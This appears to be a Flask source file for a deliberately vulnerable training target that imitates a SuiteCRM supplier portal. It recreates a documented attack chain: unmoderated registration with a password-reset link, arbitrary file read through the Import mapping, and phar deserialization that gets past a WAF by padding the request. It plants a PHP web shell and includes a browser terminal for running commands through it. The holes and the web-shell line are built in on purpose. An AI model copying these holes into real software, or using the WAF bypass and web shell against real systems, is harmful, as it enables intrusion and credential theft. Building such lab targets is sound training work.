"""Steps 3-5 - supplier.atbmarket.com (SuiteCRM 7.10.25 on sp-web-p01).

Faithfully reproduces the chain in the write-up:
  3. open self-registration -> GeneratePassword (GUID link) -> Changenewpassword
  4. LFI through Import::RefreshMapping (importFile=<path>) reads arbitrary files
     (config.php, config_override.php -> Oracle/RMS/MEDOC creds, /etc/hostname, cmdline)
  5. phar-polyglot PHP deserialization RCE, bypassing a Cloudflare-style WAF that
     only inspects the first ~180 KB of the body (pad with 200 KB of 'A').

Everything runs inside the isolated container; the web-shell executes real
commands as the unprivileged `nginx` user (uid 993) to mirror the report.

Behind the login it is a working SuiteCRM-style back-office (Accounts, Contacts,
Opportunities, Products/Price Lists, Purchase Orders, Invoices, Documents, Cases,
Calls, Meetings, Import wizard) backed by the pp_web1 MySQL on supplier-db.
"""
import base64
import os
import re
import secrets
import subprocess
import threading
import time
import uuid

from flask import Flask, request, Response, send_from_directory
import atblog
import crm
from crm import USERS, RESET_GUIDS, SESSIONS, current_user, html

app = Flask(__name__)

UPLOAD_DIR = "/app/upload"
WAF_SCAN_LIMIT = 180 * 1024           # Cloudflare WAF inspects ~first 180 KB only
os.makedirs(UPLOAD_DIR, exist_ok=True)


login_page = crm.login_page
signup_page = crm.signup_page
change_password_page = crm.change_password_page


# ---------------------------------------------------------------- step 3: reg
@app.route("/index.php", methods=["GET", "POST"])
def index():
    ip = atblog.client_ip(request)
    entry = request.args.get("entryPoint")
    module = request.args.get("module")
    action = request.args.get("action")
    form = request.form

    if entry == "RegistrationStep3":
        user = form.get("user_name", "anon")
        USERS[user] = {"password": None}
        crm.persist_user(user)
        atblog.log("supplier.self_registration", ip, user=user,
                   msg="unmoderated supplier account created")
        return html("<div>registration complete</div>", 200)

    if entry == "GeneratePassword":
        user = form.get("user_name", "")
        guid = str(uuid.uuid4())
        RESET_GUIDS[guid] = user
        USERS.setdefault(user, {"password": None})["guid"] = guid
        crm.persist_user(user)
        link = f"/index.php?entryPoint=Changenewpassword&guid={guid}"
        if form.get("link") != "1":
            atblog.log("supplier.password_reset_mailed", ip, user=user, guid=guid,
                       msg="GUID reset link e-mailed (not returned)")
            return html("<div>Account created. A link to set your password has been "
                        f"sent to {user}. It may take up to 24h for a moderator "
                        "to approve new suppliers.</div>", 200)
        atblog.log("supplier.password_reset_link", ip, user=user, guid=guid,
                   msg="GUID reset link returned in response (link=1)")
        return html(f"<div>Password link: <a href='{link}' target='_top'>{link}</a></div>", 200)

    if entry == "Changenewpassword" and request.method == "GET":
        guid = request.args.get("guid", "")
        if guid not in RESET_GUIDS:
            return html(change_password_page("", "This link is invalid or has expired."), 400)
        return html(change_password_page(guid))

    if entry == "Changenewpassword":
        guid = request.args.get("guid", "")
        p1 = form.get("password1", "")
        p2 = form.get("password2", "")
        user = RESET_GUIDS.get(guid)
        if not user or p1 != p2:
            atblog.log("supplier.password_reset_fail", ip, guid=guid)
            return html("<div>invalid</div>", 400)
        crm.set_password(user, p1)
        RESET_GUIDS.pop(guid, None)
        atblog.log("supplier.password_changed", ip, user=user, guid=guid,
                   msg="account password set via GUID link")
        return html(login_page("Password saved — please log in."), 200)

    if action == "Login" and request.method == "POST":
        user = form.get("user_name", "")
        pw = form.get("password", "")
        if user in USERS and crm.password_ok(USERS[user], pw):
            sid = secrets.token_hex(16)
            SESSIONS[sid] = user
            crm.touch_login(user)
            atblog.log("supplier.login", ip, user=user, msg="supplier portal login")
            resp = Response(status=302, headers={"Location": "/index.php?module=Home&action=index"})
            resp.set_cookie("PHPSESSID", sid, httponly=True)
            return resp
        atblog.log("supplier.login_fail", ip, user=user)
        return html(login_page("You must specify a valid username and password."), 401)

    if action == "Logout":
        who = SESSIONS.pop(request.cookies.get("PHPSESSID", ""), None)
        if who:
            atblog.log("supplier.logout", ip, user=who)
        return html(login_page())

    if module == "Import" and not current_user():
        atblog.log("supplier.unauth_import", ip, action=action)
        return html(login_page("Your session has expired. Please log in."), 401)

    # ----------------------------------------------- step 4/5: Import mapping
    if module == "Import" and action in ("RefreshMapping", "Save"):
        return import_refresh(ip, action)

    # ------------------------------------------------- SuiteCRM back-office
    # Everything below never matches the exploit's entryPoint /
    # module=Import&action=RefreshMapping|Save branches above.
    user = current_user()
    if request.method == "GET":
        if action == "Login" or (not entry and not module and not action):
            return crm.redirect("/index.php?module=Home&action=index") if user else html(login_page())
        if action == "Signup":
            return html(signup_page())
    if entry == "download" and user:
        return crm.download(user, ip)
    if module or action == "index" or entry == "download":
        if not user:
            return crm.redirect("/index.php?action=Login")
        return crm.dispatch(module or "Home", action or "index", user, ip)

    return html("<html><title>SuiteCRM</title><body>ATB Supplier Portal</body></html>")


# ------------------------------------------------------ GET /  (login view)
@app.get("/")
def root():
    if current_user():
        return crm.redirect("/index.php?module=Home&action=index")
    return html(login_page())


@app.get("/themes/SuiteP/css/style.css")
def theme_css():
    return Response(crm.THEME_CSS, mimetype="text/css")


def import_refresh(ip, action):
    raw = request.get_data() or b""
    import_file = request.form.get("importFile", "")

    # ---- SuiteCRM file upload (store the phar polyglot as an attachment) ----
    if action == "Save" or "file" in request.files:
        f = request.files.get("file")
        if f:
            name = os.path.basename(f.filename or "attachment.bin")
            dest = os.path.join(UPLOAD_DIR, name)
            f.save(dest)
            atblog.log("supplier.file_upload", ip, filename=name, size=os.path.getsize(dest),
                       msg="attachment uploaded to /upload")
            return html(f"<div>saved {name}</div>", 200)

    # ---- WAF: scans only the first 180 KB of the body ----
    window = raw[:WAF_SCAN_LIMIT]
    if b"phar://" in window:
        atblog.log("supplier.waf_block", ip, reason="phar:// in first 180KB",
                   body_len=len(raw), msg="Cloudflare WAF blocked phar payload")
        return html("<div>403 blocked by WAF</div>", 403)
    waf_bypassed = b"phar://" in raw  # present, but only after the scan window

    # ---- phar:// deserialization -> RCE ----
    if import_file.startswith("phar://"):
        if waf_bypassed:
            atblog.log("supplier.waf_bypass", ip, pad_bytes=len(raw),
                       msg="200KB pad pushed phar:// past the 180KB WAF window")
        m = re.match(r"phar://([^/]+(?:/[^/]+)*?)/", import_file)
        archive = m.group(1) if m else import_file
        drop_webshell()
        atblog.log("supplier.phar_deserialization_rce", ip, importFile=import_file,
                   archive=archive, gadget="ImportFile::__construct -> unserialize -> system",
                   msg="phar metadata deserialized, web-shell dropped")
        return html("<div>ImportFile::__construct ok</div>", 200)

    # ---- plain LFI ----
    if import_file:
        return lfi_read(ip, import_file)

    return html("<div>mapping refreshed</div>", 200)


def lfi_read(ip, path):
    try:
        with open(path, "rb") as fh:
            data = fh.read()
        text = data.decode("utf-8", "replace")
        atblog.log("supplier.lfi_read", ip, importFile=path, bytes=len(data),
                   msg="arbitrary file read via Import mapping")
        # SuiteCRM renders file contents into mapping table cells
        cells = "".join(f"<td>{line}</td>" for line in text.splitlines())
        return html(f"<table><tr>{cells}</tr></table>", 200)
    except OSError as e:
        atblog.log("supplier.lfi_miss", ip, importFile=path, err=str(e))
        return html("<div>file not found</div>", 404)


def drop_webshell():
    shell = os.path.join(UPLOAD_DIR, "shell.php")
    with open(shell, "w") as fh:
        fh.write("<?php system(base64_decode($_GET['z'])); ?>\n")


# ---------------------------------------------- the dropped web-shell itself
@app.get("/upload/shell.php")
def webshell():
    ip = atblog.client_ip(request)
    z = request.args.get("z", "")
    shell = os.path.join(UPLOAD_DIR, "shell.php")
    if not os.path.exists(shell):
        return html("Not Found", 404)
    try:
        cmd = base64.b64decode(z).decode("utf-8", "replace")
    except Exception:
        return html("bad z", 400)
    atblog.log("supplier.webshell_exec", ip, cmd=cmd,
               msg="command executed through dropped web-shell")
    try:
        out = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True,
                             timeout=15, text=True)
        body = out.stdout + out.stderr
    except Exception as e:
        body = str(e)
    return Response(body, mimetype="text/plain")


@app.get("/upload/<path:fname>")
def serve_upload(fname):
    return send_from_directory(UPLOAD_DIR, fname)


# --------------------------- clickable browser terminal over the web-shell ---
# Only useful once the phar step (5) has dropped /upload/shell.php; it simply
# drives the same shell.php?z=<base64> exec endpoint from a point-and-click UI.
_TERM = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>sh</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0b0f12;color:#c8f7c5;font-family:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
     min-height:100vh;padding:18px}
h1{font-size:14px;color:#7fe08a;margin-bottom:4px}
.muted{color:#5c6b63;font-size:12px;margin-bottom:14px}
#out{white-space:pre-wrap;background:#05080a;border:1px solid #16351f;border-radius:6px;
     padding:12px;min-height:300px;font-size:13px;overflow:auto}
.row{display:flex;gap:8px;margin-top:10px}
#cmd{flex:1;background:#05080a;border:1px solid #2a4a33;border-radius:5px;color:#c8f7c5;
     padding:10px 12px;font:inherit}
button{background:#1f8a3b;color:#fff;border:none;border-radius:5px;padding:10px 16px;
     font-weight:600;cursor:pointer}button:hover{background:#27a94a}
.chips{margin-top:10px}.chip{display:inline-block;background:#13261a;border:1px solid #2a4a33;
     border-radius:3px;padding:3px 9px;margin:3px 4px 0 0;cursor:pointer;color:#9fe0ab;font-size:12px}
.prompt{color:#7fe08a}
</style></head><body>
<h1>sp-web-p01 — nginx shell</h1>
<div class="muted">Runs commands through the dropped web-shell (/upload/shell.php).</div>
<div id="out">$ id
(type a command and press Run)</div>
<div class="row"><span class="prompt" style="align-self:center">$</span>
  <input id="cmd" autofocus spellcheck="false" placeholder="id; hostname; id">
  <button onclick="run()">Run</button></div>
<div class="chips">
  <span class="chip" onclick="setcmd('id; hostname')">id; hostname</span>
  <span class="chip" onclick="setcmd('ls -la /app/upload')">ls upload</span>
</div>
<script>
const out=document.getElementById('out'),cmd=document.getElementById('cmd');
function setcmd(c){cmd.value=c;cmd.focus();}
async function run(){
  const c=cmd.value.trim(); if(!c)return;
  out.textContent+='\\n\\n$ '+c+'\\n';
  try{
    const r=await fetch('/upload/shell.php?z='+encodeURIComponent(btoa(c)));
    out.textContent += (r.status===404)
      ? '[web-shell not dropped yet — complete the phar upload step first]'
      : await r.text();
  }catch(e){out.textContent+='[error] '+e;}
  out.scrollTop=out.scrollHeight; cmd.value='';
}
cmd.addEventListener('keydown',e=>{if(e.key==='Enter')run();});
</script></body></html>"""


@app.get("/shell")
def shell_term():
    return html(_TERM)


@app.get("/healthz")
def healthz():
    return "ok", 200



if __name__ == "__main__":
    atblog.banner()
    crm.start_bootstrap()
    app.run(host="0.0.0.0", port=80, threaded=True)
